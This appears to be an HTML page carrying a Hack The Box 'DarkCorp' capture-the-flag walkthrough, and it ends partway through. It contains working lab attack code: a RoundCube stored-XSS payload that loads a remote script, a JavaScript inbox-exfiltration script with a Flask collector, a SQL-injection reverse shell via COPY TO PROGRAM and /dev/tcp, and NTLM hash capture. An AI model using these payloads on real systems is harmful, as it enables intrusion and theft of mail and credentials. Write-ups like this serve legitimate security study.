@@ -1,0 +1,1087 @@
+<!DOCTYPE html>
+<html lang="en" class="dark">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>HTB: DarkCorp — QA210</title>
+<meta name="description" content="Hack The Box DarkCorp — Insane difficulty walkthrough by QA210">
+<meta name="author" content="QA210">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>💀</text></svg>">
+<link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-bash.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-powershell.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-sql.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-markup.min.js"></script>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Inter:wght@400;500;600;700;800&display=swap');
+
+:root {
+  --bg-primary: #0d1117;
+  --bg-secondary: #161b22;
+  --bg-tertiary: #1c2333;
+  --bg-code: #0d1117;
+  --border: #30363d;
+  --border-light: #21262d;
+  --text-primary: #e6edf3;
+  --text-secondary: #8b949e;
+  --text-muted: #6e7681;
+  --accent-green: #3fb950;
+  --accent-blue: #58a6ff;
+  --accent-red: #f85149;
+  --accent-yellow: #d29922;
+  --accent-purple: #bc8cff;
+  --accent-orange: #f0883e;
+  --accent-cyan: #39d353;
+  --link: #58a6ff;
+  --link-hover: #79c0ff;
+  --scrollbar-thumb: #30363d;
+  --scrollbar-track: #161b22;
+  --toc-active: #58a6ff;
+  --callout-info-bg: rgba(56,139,253,0.1);
+  --callout-info-border: #388bfd;
+  --callout-warn-bg: rgba(210,153,34,0.1);
+  --callout-warn-border: #d29922;
+  --callout-danger-bg: rgba(248,81,73,0.1);
+  --callout-danger-border: #f85149;
+  --callout-success-bg: rgba(63,185,80,0.1);
+  --callout-success-border: #3fb950;
+}
+
+* { margin:0; padding:0; box-sizing:border-box; }
+
+html {
+  scroll-behavior: smooth;
+  scrollbar-width: thin;
+  scrollbar-color: var(--scrollbar-thumb) var(--scrollbar-track);
+}
+
+body {
+  font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+  background: var(--bg-primary);
+  color: var(--text-primary);
+  line-height: 1.75;
+  font-size: 16px;
+}
+
+::-webkit-scrollbar { width:8px; height:8px; }
+::-webkit-scrollbar-track { background:var(--scrollbar-track); }
+::-webkit-scrollbar-thumb { background:var(--scrollbar-thumb); border-radius:4px; }
+::-webkit-scrollbar-thumb:hover { background:#484f58; }
+
+a { color:var(--link); text-decoration:none; transition:color .2s; }
+a:hover { color:var(--link-hover); }
+
+/* ── Header ───────────────────────────── */
+.site-header {
+  position:sticky; top:0; z-index:100;
+  background:rgba(13,17,23,0.85);
+  backdrop-filter:blur(12px);
+  border-bottom:1px solid var(--border);
+  padding:0 2rem;
+  height:56px;
+  display:flex; align-items:center; justify-content:space-between;
+}
+.site-header .logo {
+  font-family:'JetBrains Mono',monospace;
+  font-weight:700; font-size:1.15rem;
+  color:var(--accent-green);
+  display:flex; align-items:center; gap:8px;
+}
+.site-header .logo .dot { color:var(--accent-red); }
+.site-header nav { display:flex; gap:1.5rem; align-items:center; }
+.site-header nav a { color:var(--text-secondary); font-size:.875rem; font-weight:500; }
+.site-header nav a:hover { color:var(--text-primary); }
+
+.hamburger {
+  display:none; background:none; border:none; color:var(--text-primary);
+  cursor:pointer; font-size:1.5rem;
+}
+
+/* ── Layout ───────────────────────────── */
+.page-layout {
+  display:grid;
+  grid-template-columns:260px 1fr;
+  max-width:1400px;
+  margin:0 auto;
+  min-height:calc(100vh - 56px);
+}
+
+/* ── TOC Sidebar ──────────────────────── */
+.toc-sidebar {
+  position:sticky; top:56px;
+  height:calc(100vh - 56px);
+  overflow-y:auto;
+  padding:1.5rem 1rem 1.5rem 1.5rem;
+  border-right:1px solid var(--border);
+  background:var(--bg-primary);
+}
+.toc-sidebar h3 {
+  font-size:.75rem;
+  text-transform:uppercase;
+  letter-spacing:.08em;
+  color:var(--text-muted);
+  margin-bottom:.75rem;
+  font-weight:600;
+}
+.toc-sidebar ul { list-style:none; }
+.toc-sidebar li { margin-bottom:2px; }
+.toc-sidebar a {
+  display:block;
+  padding:4px 8px;
+  border-radius:4px;
+  font-size:.8rem;
+  color:var(--text-secondary);
+  transition:all .15s;
+  line-height:1.4;
+}
+.toc-sidebar a:hover {
+  color:var(--text-primary);
+  background:var(--bg-secondary);
+}
+.toc-sidebar a.active {
+  color:var(--toc-active);
+  background:rgba(88,166,255,0.1);
+  font-weight:600;
+}
+.toc-sidebar .toc-h3 { padding-left:18px; font-size:.75rem; }
+
+/* ── Main Content ─────────────────────── */
+.main-content {
+  padding:2.5rem 3rem 4rem;
+  max-width:860px;
+  width:100%;
+}
+
+/* ── Page Hero ────────────────────────── */
+.page-hero {
+  margin-bottom:2.5rem;
+  padding-bottom:2rem;
+  border-bottom:1px solid var(--border);
+}
+.page-hero .box-badge {
+  display:inline-block;
+  background:var(--accent-red);
+  color:#fff;
+  font-size:.7rem;
+  font-weight:700;
+  padding:2px 10px;
+  border-radius:12px;
+  text-transform:uppercase;
+  letter-spacing:.05em;
+  margin-bottom:.75rem;
+}
+.page-hero h1 {
+  font-size:2.25rem;
+  font-weight:800;
+  margin-bottom:.5rem;
+  letter-spacing:-.02em;
+}
+.page-hero .meta {
+  color:var(--text-secondary);
+  font-size:.875rem;
+  display:flex; flex-wrap:wrap; gap:.75rem; align-items:center;
+}
+.page-hero .meta .sep { color:var(--text-muted); }
+
+/* ── Box Info Card ────────────────────── */
+.box-info-card {
+  background:var(--bg-secondary);
+  border:1px solid var(--border);
+  border-radius:8px;
+  padding:1.25rem 1.5rem;
+  margin-bottom:2rem;
+  display:grid;
+  grid-template-columns:repeat(auto-fit,minmax(180px,1fr));
+  gap:1rem;
+}
+.box-info-card .info-item .label {
+  font-size:.7rem;
+  text-transform:uppercase;
+  letter-spacing:.06em;
+  color:var(--text-muted);
+  margin-bottom:2px;
+  font-weight:600;
+}
+.box-info-card .info-item .value {
+  font-size:.95rem;
+  font-weight:600;
+  color:var(--text-primary);
+}
+
+/* ── Section Headings ─────────────────── */
+.main-content h2 {
+  font-size:1.6rem;
+  font-weight:800;
+  margin:2.5rem 0 1rem;
+  padding-bottom:.4rem;
+  border-bottom:2px solid var(--border);
+  letter-spacing:-.01em;
+  scroll-margin-top:70px;
+}
+.main-content h3 {
+  font-size:1.15rem;
+  font-weight:700;
+  margin:1.75rem 0 .75rem;
+  color:var(--text-primary);
+  scroll-margin-top:70px;
+}
+.main-content h4 {
+  font-size:1rem;
+  font-weight:600;
+  margin:1.25rem 0 .5rem;
+  color:var(--text-secondary);
+}
+.main-content p {
+  margin-bottom:1rem;
+  color:var(--text-secondary);
+  line-height:1.8;
+}
+
+/* ── Code Blocks ──────────────────────── */
+.code-block-wrapper {
+  position:relative;
+  margin:1rem 0 1.25rem;
+  border-radius:8px;
+  overflow:hidden;
+  border:1px solid var(--border);
+}
+.code-block-header {
+  display:flex;
+  justify-content:space-between;
+  align-items:center;
+  padding:6px 14px;
+  background:var(--bg-tertiary);
+  border-bottom:1px solid var(--border);
+  font-size:.72rem;
+  color:var(--text-muted);
+  font-family:'JetBrains Mono',monospace;
+}
+.code-block-header .lang-label { text-transform:uppercase; font-weight:600; letter-spacing:.04em; }
+.copy-btn {
+  background:none; border:1px solid var(--border);
+  color:var(--text-muted);
+  font-size:.7rem;
+  padding:2px 10px;
+  border-radius:4px;
+  cursor:pointer;
+  font-family:'JetBrains Mono',monospace;
+  transition:all .2s;
+}
+.copy-btn:hover { color:var(--text-primary); border-color:var(--text-muted); }
+.copy-btn.copied { color:var(--accent-green); border-color:var(--accent-green); }
+
+.code-block-wrapper pre {
+  margin:0!important;
+  padding:1rem!important;
+  background:var(--bg-code)!important;
+  font-family:'JetBrains Mono',monospace!important;
+  font-size:.82rem!important;
+  line-height:1.6!important;
+  overflow-x:auto;
+}
+.code-block-wrapper code {
+  font-family:'JetBrains Mono',monospace!important;
+  font-size:.82rem!important;
+}
+
+p code, li code {
+  background:var(--bg-tertiary);
+  border:1px solid var(--border);
+  padding:1px 6px;
+  border-radius:4px;
+  font-family:'JetBrains Mono',monospace;
+  font-size:.82em;
+  color:var(--accent-orange);
+}
+
+/* ── Callouts ──────────────────────────── */
+.callout {
+  padding:.85rem 1rem;
+  border-radius:6px;
+  border-left:3px solid;
+  margin:1rem 0 1.25rem;
+  font-size:.9rem;
+}
+.callout p { margin:0; color:var(--text-secondary); }
+.callout-title {
+  font-weight:700;
+  font-size:.8rem;
+  text-transform:uppercase;
+  letter-spacing:.04em;
+  margin-bottom:4px;
+}
+.callout-info { background:var(--callout-info-bg); border-color:var(--callout-info-border); }
+.callout-info .callout-title { color:var(--callout-info-border); }
+.callout-warn { background:var(--callout-warn-bg); border-color:var(--callout-warn-border); }
+.callout-warn .callout-title { color:var(--callout-warn-border); }
+.callout-danger { background:var(--callout-danger-bg); border-color:var(--callout-danger-border); }
+.callout-danger .callout-title { color:var(--callout-danger-border); }
+.callout-success { background:var(--callout-success-bg); border-color:var(--callout-success-border); }
+.callout-success .callout-title { color:var(--callout-success-border); }
+
+/* ── Attack Path Diagram ──────────────── */
+.attack-path {
+  background:var(--bg-secondary);
+  border:1px solid var(--border);
+  border-radius:8px;
+  padding:1.25rem 1.5rem;
+  margin:1.5rem 0;
+  font-family:'JetBrains Mono',monospace;
+  font-size:.78rem;
+  line-height:1.7;
+  overflow-x:auto;
+}
+.attack-path .step {
+  display:flex;
+  align-items:baseline;
+  gap:.5rem;
+  margin-bottom:.25rem;
+}
+.attack-path .arrow { color:var(--accent-green); }
+.attack-path .host { color:var(--accent-cyan); font-weight:700; }
+.attack-path .technique { color:var(--accent-orange); }
+.attack-path .cred { color:var(--accent-purple); }
+
+/* ── Lists ─────────────────────────────── */
+.main-content ul, .main-content ol {
+  margin:.5rem 0 1rem 1.5rem;
+  color:var(--text-secondary);
+}
+.main-content li { margin-bottom:.35rem; line-height:1.7; }
+
+/* ── Tables ────────────────────────────── */
+.main-content table {
+  width:100%;
+  border-collapse:collapse;
+  margin:1rem 0;
+  font-size:.85rem;
+}
+.main-content th, .main-content td {
+  padding:8px 12px;
+  border:1px solid var(--border);
+  text-align:left;
+}
+.main-content th {
+  background:var(--bg-secondary);
+  font-weight:600;
+  color:var(--text-primary);
+  font-size:.75rem;
+  text-transform:uppercase;
+  letter-spacing:.04em;
+}
+.main-content td { color:var(--text-secondary); }
+
+/* ── Footer ────────────────────────────── */
+.site-footer {
+  border-top:1px solid var(--border);
+  padding:1.5rem 2rem;
+  text-align:center;
+  color:var(--text-muted);
+  font-size:.8rem;
+}
+
+/* ── Mobile Overlay ────────────────────── */
+.toc-overlay {
+  display:none;
+  position:fixed;
+  inset:0;
+  background:rgba(0,0,0,0.5);
+  z-index:200;
+}
+.toc-overlay.show { display:block; }
+.toc-mobile-panel {
+  display:none;
+  position:fixed;
+  left:0; top:0; bottom:0;
+  width:280px;
+  background:var(--bg-primary);
+  border-right:1px solid var(--border);
+  z-index:201;
+  overflow-y:auto;
+  padding:1.5rem;
+}
+.toc-mobile-panel.show { display:block; }
+.toc-mobile-panel .close-btn {
+  background:none; border:none;
+  color:var(--text-secondary);
+  font-size:1.2rem;
+  cursor:pointer;
+  float:right;
+}
+
+/* ── Responsive ────────────────────────── */
+@media (max-width:1024px) {
+  .page-layout { grid-template-columns:1fr; }
+  .toc-sidebar { display:none; }
+  .hamburger { display:block; }
+  .main-content { padding:1.5rem 1.25rem 3rem; }
+  .page-hero h1 { font-size:1.75rem; }
+}
+@media (max-width:640px) {
+  .site-header { padding:0 1rem; }
+  .main-content { padding:1rem .75rem 2rem; }
+  .page-hero h1 { font-size:1.4rem; }
+  .box-info-card { grid-template-columns:1fr 1fr; }
+}
+</style>
+</head>
+<body>
+
+<!-- ═══ Header ═══ -->
+<header class="site-header">
+  <div class="logo">
+    <span>QA210</span><span class="dot">:</span><span>~$</span>
+  </div>
+  <nav>
+    <a href="#">Writeups</a>
+    <a href="#">Tools</a>
+    <a href="#">About</a>
+  </nav>
+  <button class="hamburger" onclick="toggleMobileToc()" aria-label="Menu">☰</button>
+</header>
+
+<!-- ═══ Mobile TOC ═══ -->
+<div class="toc-overlay" id="tocOverlay" onclick="toggleMobileToc()"></div>
+<div class="toc-mobile-panel" id="tocMobilePanel">
+  <button class="close-btn" onclick="toggleMobileToc()">✕</button>
+  <h3 style="margin-top:1rem">Table of Contents</h3>
+  <ul id="tocMobile"></ul>
+</div>
+
+<!-- ═══ Layout ═══ -->
+<div class="page-layout">
+
+<!-- ── TOC Sidebar ── -->
+<aside class="toc-sidebar">
+  <h3>Contents</h3>
+  <ul id="tocDesktop"></ul>
+</aside>
+
+<!-- ── Main Content ── -->
+<main class="main-content">
+
+<!-- ═══ HERO ═══ -->
+<div class="page-hero">
+  <span class="box-badge">Insane</span>
+  <h1>HTB: DarkCorp</h1>
+  <div class="meta">
+    <span>QA210</span>
+    <span class="sep">·</span>
+    <span>Feb 8, 2025</span>
+    <span class="sep">·</span>
+    <span>3 Hosts · AD · Linux + Windows</span>
+  </div>
+</div>
+
+<!-- ═══ BOX INFO ═══ -->
+<div class="box-info-card">
+  <div class="info-item"><div class="label">Box</div><div class="value">DarkCorp</div></div>
+  <div class="info-item"><div class="label">Difficulty</div><div class="value" style="color:var(--accent-red)">Insane</div></div>
+  <div class="info-item"><div class="label">OS</div><div class="value">Windows</div></div>
+  <div class="info-item"><div class="label">User</div><div class="value">02:45:55</div></div>
+  <div class="info-item"><div class="label">Root</div><div class="value">03:11:42</div></div>
+  <div class="info-item"><div class="label">Creators</div><div class="value">0xEr3bus, ctrlzero</div></div>
+</div>
+
+<!-- ═══ ATTACK PATH ═══ -->
+<div class="attack-path">
+  <div class="step"><span class="host">DRIP</span> <span class="arrow">→</span> CVE-2024-42009 XSS <span class="arrow">→</span> <span class="technique">email exfil</span> <span class="arrow">→</span> <span class="cred">bcase</cred></span></div>
+  <div class="step"><span class="host">DRIP</span> <span class="arrow">→</span> SQLi → PG RCE <span class="arrow">→</span> <span class="cred">postgres@drip</span></div>
+  <div class="step"><span class="host">DRIP</span> <span class="arrow">→</span> GPG backup decrypt <span class="arrow">→</span> <span class="cred">victor.r@darkcorp.htb</span></div>
+  <div class="step"><span class="host">WEB-01</span> <span class="arrow">→</span> NTLM relay + DNS + Printer Bug <span class="arrow">→</span> <span class="cred">Admin@WEB-01</span></div>
+  <div class="step"><span class="host">WEB-01</span> <span class="arrow">→</span> DPAPI stored cred <span class="arrow">→</span> spray <span class="arrow">→</span> <span class="cred">john.w@darkcorp.htb</span></div>
+  <div class="step"><span class="host">DC-01</span> <span class="arrow">→</span> Shadow Credential <span class="arrow">→</span> <span class="cred">angela.w@darkcorp.htb</span></div>
+  <div class="step"><span class="host">DRIP</span> <span class="arrow">→</span> UPN Spoofing <span class="arrow">→</span> <span class="cred">angela.w.adm@drip</span> <span class="arrow">→</span> <span class="cred">root@drip</span></div>
+  <div class="step"><span class="host">DRIP</span> <span class="arrow">→</span> SSSD cached creds <span class="arrow">→</span> <span class="cred">taylor.b.adm@DC-01</span></div>
+  <div class="step"><span class="host">DC-01</span> <span class="arrow">→</span> GPO Abuse <span class="arrow">→</span> <span class="cred">Administrator@DC-01</span></div>
+</div>
+
+<!-- ══════════════════════════════════════════════════════════════════════ -->
+<h2 id="recon">Recon</h2>
+
+<h3 id="recon-nmap">Initial Scanning</h3>
+<p>Two TCP ports open — SSH on 22 and HTTP on 80. The OS fingerprint is confusing: OpenSSH and nginx versions scream Debian 12 (Bookworm), but TTL 127 is a Windows hop indicator. HTB tags this as a Windows box, so a Linux VM/container on a Windows hypervisor is likely.</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">$ nmap -p- -vvv --min-rate 10000 10.10.11.54
+Nmap scan report for 10.10.11.54
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http</code></pre>
+</div>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">$ nmap -p 22,80 -sCV 10.10.11.54
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3
+80/tcp open  http    nginx 1.22.1
+|_http-title: Site doesn't have a title (text/html).</code></pre>
+</div>
+
+<h3 id="recon-subdomain">Subdomain Fuzz</h3>
+<p>Visiting the IP redirects (via JavaScript) to <code>drip.htb</code>. Since the server is doing host-based routing, subdomain fuzzing is the next logical step. <code>ffuf</code> with auto-calibration picks up a single result:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">$ ffuf -u http://10.10.11.54 -H "Host: FUZZ.drip.htb" \
+    -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -ac
+
+mail                    [Status: 200, Size: 5323, Words: 366]</code></pre>
+</div>
+
+<p>Add both to <code>/etc/hosts</code>:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">10.10.11.54 drip.htb mail.drip.htb</code></pre>
+</div>
+
+<h3 id="recon-drip">drip.htb — TCP 80</h3>
+<p>The main site is a webmail solutions company page using the Volt Bootstrap theme from Themesberg. Notable features:</p>
+<ul>
+  <li>A <strong>contact form</strong> that POSTs to <code>/contact</code> — potential for XSS or user interaction</li>
+  <li>A <strong>mailing list subscribe</strong> form that sends a GET to <code>/index?email=[input]</code> — likely non-functional</li>
+  <li>A <strong>Signup</strong> link at <code>/signup</code></li>
+  <li>A <strong>Sign In</strong> link redirecting to <code>mail.drip.htb</code></li>
+</ul>
+<p>Response headers don't reveal much beyond <code>nginx/1.22.1</code>. The 404 page is generic, and <code>feroxbuster</code> finds nothing beyond <code>/index</code> and <code>/contact</code>.</p>
+
+<h3 id="recon-mail">mail.drip.htb</h3>
+<p>RoundCube webmail instance. Registering on drip.htb creates working credentials here. The "About" dialog reveals the version is <strong>1.6.7</strong>. Both session cookies have <code>HttpOnly</code> set — direct cookie theft via XSS is off the table.</p>
+
+<p>Registering a user named <code>root</code> is interesting: it receives cron-driven emails every two minutes that leak another username (<code>ebelford</code>) and the mail server software (Dovecot).</p>
+
+<!-- ══════════════════════════════════════════════════════════════════════ -->
+<h2 id="shell-postgres">Shell as postgres@drip</h2>
+
+<h3 id="xss-contact">Contact Form — HTML + Recipient Override</h3>
+<p>The contact form POST contains two hidden fields: <code>content=text</code> and <code>recipient=support@drip.htb</code>. Both are user-controllable. Changing the recipient to my own account delivers the mail to me instead. Changing <code>content</code> from <code>text</code> to <code>html</code> makes the server render HTML in the email body.</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">http</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">POST /contact HTTP/1.1
+Host: drip.htb
+Content-Type: application/x-www-form-urlencoded
+
+name=qa210&email=qa210@drip.htb&message=&lt;body&gt;HTML+&lt;b&gt;test&lt;/b&gt;&lt;/body&gt;&content=html&recipient=qa210%40drip.htb</code></pre>
+</div>
+
+<h3 id="xss-cve">CVE-2024-42009 — RoundCube Stored XSS</h3>
+<p>This version (1.6.7) is vulnerable to CVE-2024-42009, a desanitization XSS discovered by Sonar Source. The <code>washtml</code> sanitizer correctly strips dangerous attributes, but the post-processing step that converts <code>bgcolor</code> uses a regex that can be tricked:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash"># The broken regex:
+/\s?bgcolor=["\']*[a-z0-9#]+["\']*/i
+
+# Bypass: nest bgcolor inside another attribute
+&lt;body title="bgcolor=foo" name="bar style=animation-name:progress-bar-stripes onanimationstart=alert(origin) foo=bar"&gt;
+  Pwned
+&lt;/body&gt;</code></pre>
+</div>
+
+<p>The regex rips out <code>bgcolor=foo"</code> and the leftover quotes collapse, leaving a valid <code>style</code> + <code>onanimationstart</code> handler on the <code>&lt;body&gt;</code> tag.</p>
+
+<h3 id="xss-script-load">Loading a Remote Script</h3>
+<p>To make the payload reusable, I base64-encode a script loader and use <code>eval(atob())</code>:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash"># Loader payload (base64 of JS that creates a script tag)
+PAYLOAD=$(echo -n 'var s=document.createElement("script");s.src="http://10.10.14.8/qa.js";document.head.appendChild(s);' | base64 -w0)
+
+# Full HTML payload
+&lt;body title="bgcolor=foo" name="bar style=animation-name:progress-bar-stripes onanimationstart=eval(atob('${PAYLOAD}')) foo=bar"&gt;
+  Click
+&lt;/body&gt;</code></pre>
+</div>
+
+<p>Sending this to <code>bcase@drip.htb</code> triggers the XSS in their browser. Within seconds, a GET request for <code>/qa.js</code> arrives from the target IP.</p>
+
+<h3 id="xss-exfil">Email Exfiltration</h3>
+<p>RoundCube opens individual emails at URLs like <code>/?_task=mail&_action=show&_uid=ID&_mbox=INBOX&_extwin=1</code>. My exfil script iterates through message IDs and POSTs the base64'd content back:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">javascript</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-javascript">// qa.js — exfil bcase inbox
+for (let i = 1; i <= 20; i++) {
+  fetch(`/mail/?_task=mail&_action=show&_uid=${i}&_mbox=INBOX&_extwin=1`, {mode:'no-cors'})
+    .then(r => r.text())
+    .then(t => fetch(`http://10.10.14.8/exfil?id=${i}&d=` + btoa(t)));
+}</code></pre>
+</div>
+
+<p>A lightweight Flask collector processes the callbacks:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">python</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-python">from flask import Flask, request
+import base64
+
+app = Flask(__name__)
+
+@app.route('/exfil')
+def collect():
+    mid = request.args.get('id')
+    data = base64.b64decode(request.args.get('d'))
+    if b'SERVER ERROR' not in data:
+        with open(f'bcase_{mid}.html', 'wb') as f:
+            f.write(data)
+        print(f'[+] Saved email #{mid}')
+    return 'ok'
+
+@app.route('/qa.js')
+def payload():
+    return open('qa.js').read(), {'Content-Type':'application/javascript'}
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=80)</code></pre>
+</div>
+
+<p>Email #2 is the prize — from <code>ebelford</code>, it reveals a private subdomain: <code>dev-a3f1-01.drip.htb</code>.</p>
+
+<h3 id="sqli-access">Dev Dashboard Access</h3>
+<p>The dev subdomain hosts a login form. Clicking "Reset Password" and entering <code>bcase@drip.htb</code> sends a reset link to the mailbox. Since we can read bcase's mail, we intercept the link, set a new password, and log in.</p>
+
+<p>The <strong>Analytics</strong> page at <code>/analytics</code> has a search feature that crashes with a raw PostgreSQL error — the input is concatenated directly into the SQL query without quoting.</p>
+
+<h3 id="sqli-rce-copy">SQLi → RCE via COPY TO PROGRAM</h3>
+<p>Stacked queries are enabled, so we can execute arbitrary SQL. The classic Postgres RCE technique uses <code>COPY ... TO PROGRAM</code>, but the word "COPY" is filtered. Bypassing with <code>CHR(67)</code>:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">sql</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-sql">'qa210'; DO $$ DECLARE cmd text; BEGIN
+  cmd := CHR(67) || 'OPY (SELECT $$') to program ''bash -c "bash -i >& /dev/tcp/10.10.14.8/443 0>&1"''';
+  EXECUTE cmd;
+END $$;</code></pre>
+</div>
+
+<div class="callout callout-info">
+  <div class="callout-title">Info</div>
+  <p>An alternative RCE path exists via <code>archive_command</code> — modifying the PostgreSQL config to set <code>archive_command</code> to a reverse shell and reloading the config. The <code>COPY TO PROGRAM</code> method is simpler.</p>
+</div>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">$ nc -lvnp 443
+Connection from 10.10.11.54 60444!
+bash: cannot set terminal process group (126146): Inappropriate ioctl for device
+postgres@drip:/var/lib/postgresql/15/main$</code></pre>
+</div>
+
+<!-- ══════════════════════════════════════════════════════════════════════ -->
+<h2 id="auth-victor">Auth as Victor@darkcorp.htb</h2>
+
+<h3 id="enum-drip">Drip Enumeration</h3>
+<p>The shell runs as <code>postgres</code> on host <code>drip</code> at <code>172.16.20.3</code>. Three user homes exist (<code>bcase</code>, <code>ebelford</code>, <code>vmail</code>), and there's a <code>.gnupg</code> directory in the postgres home.</p>
+
+<p>Connecting to the database directly reveals the <code>dripmail</code> database with <code>Admins</code> and <code>Users</code> tables. The password hashes are MD5 but only the one I set for bcase cracks.</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">postgres@drip:~$ psql -d dripmail -c 'SELECT * FROM "Admins";'
+ id | username |             password             |      email
+----+----------+----------------------------------+-----------------
+  1 | bcase    | 465e929fc1e0853025faad58fc8cb47d | bcase@drip.htb</code></pre>
+</div>
+
+<h3 id="enum-network">Internal Network</h3>
+<p>A ping sweep reveals two more hosts on the 172.16.20.0/24 network:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">postgres@drip:~$ for i in $(seq 1 254); do ping -c1 -W1 172.16.20.$i 2>/dev/null | grep 'bytes from' & done
+172.16.20.1   # DC-01 — Domain Controller
+172.16.20.2   # WEB-01 — IIS + monitoring app</code></pre>
+</div>
+
+<p>The <code>/etc/hosts</code> file confirms the hostnames and adds the domain <code>darkcorp.htb</code>.</p>
+
+<h3 id="backup-decrypt">GPG Backup Decryption</h3>
+<p>A PGP-encrypted SQL dump sits in <code>/var/backups/postgres/dev-dripmail.old.sql.gpg</code>. The Flask app's <code>.env</code> file in <code>/var/www/html/dashboard</code> contains a database password that doubles as the GPG passphrase:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">postgres@drip:~$ gpg --batch --passphrase '2Qa2SsBkQvsc' -d /var/backups/postgres/dev-dripmail.old.sql.gpg</code></pre>
+</div>
+
+<p>The decrypted dump contains an older version of the <code>Admins</code> table with two extra entries:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">sql</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-sql">COPY public."Admins" (id, username, password, email) FROM stdin;
+1   bcase       dc5484871bc95c4eab58032884be7225    bcase@drip.htb
+2   victor.r    cac1c7b0e7008d67b6db40c03e76b9c0    victor.r@drip.htb
+3   ebelford    8bbd7f88841b4223ae63c8848969be86    ebelford@drip.htb</code></pre>
+</div>
+
+<p><code>victor.r</code>'s hash cracks to <strong>victor1gustavo@#</strong> on CrackStation. These credentials work against the domain:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">$ proxychains -q nxc smb 172.16.20.1 -u victor.r -p 'victor1gustavo@#'
+SMB  172.16.20.1  445  DC-01  [+] darkcorp.htb\victor.r:victor1gustavo@#</code></pre>
+</div>
+
+<!-- ══════════════════════════════════════════════════════════════════════ -->
+<h2 id="shell-web01">Shell as Administrator@WEB-01</h2>
+
+<h3 id="domain-enum">Domain Enumeration</h3>
+<p>With domain creds, standard enumeration reveals <code>MachineAccountQuota = 0</code> (can't create machine accounts) and ADCS is running with certificate authority <code>DARKCORP-DC-01-CA</code>.</p>
+
+<p>WEB-01's port 5000 serves a monitoring dashboard behind HTTP auth. <code>victor.r</code>'s creds work. The <strong>Check Status</strong> feature at <code>/check</code> lets you pick a target host and port — the server makes an HTTP request to that target.</p>
+
+<h3 id="ntlm-catch">Catching NTLM Auth</h3>
+<p>Pointing the status check at a host we control with Responder captures an NTLM authentication attempt from <code>svc_acc</code>:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">$ sudo responder -I tun0
+[HTTP] NTLMv2 Client   : 10.10.11.54
+[HTTP] NTLMv2 Username : darkcorp\svc_acc
+[HTTP] NTLMv2 Hash     : svc_acc::darkcorp:ffdb62442934ec99:63F597E3C5D43836...</code></pre>
+</div>
+
